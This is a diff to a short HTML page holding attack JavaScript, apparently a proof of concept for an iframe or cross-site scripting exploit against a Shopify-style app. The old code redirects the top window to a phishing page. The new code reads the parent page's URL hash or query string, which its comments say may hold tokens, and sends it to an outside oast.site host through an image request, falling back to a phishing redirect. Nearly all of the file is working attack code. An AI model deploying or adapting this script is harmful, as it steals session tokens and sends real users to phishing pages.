@@ -2,8 +2,16 @@
 <html>
 <body>
 <script>
-// Redirect the ENTIRE main webapp to your phishing page
-window.top.location = "https://d78ec9b258c326399584gifzaryyyyyyb.oast.site/shopify-login-x";
+// If sandbox allows top-navigation, steal URL fragments/params
+// that may contain tokens
+try {
+  // Some apps put tokens in the URL hash
+  var leak = window.top.location.hash || window.top.location.search;
+  new Image().src = "https://d78ec9b258c326399584gifzaryyyyyyb.oast.site/shopifyxsslog?leak=" + encodeURIComponent(leak);
+} catch(e) {
+  // Cross-origin: can't read, but CAN write (navigate)
+  window.top.location = "https://d78ec9b258c326399584gifzaryyyyyyb.oast.site/phish";
+}
 </script>
 </body>
 </html>
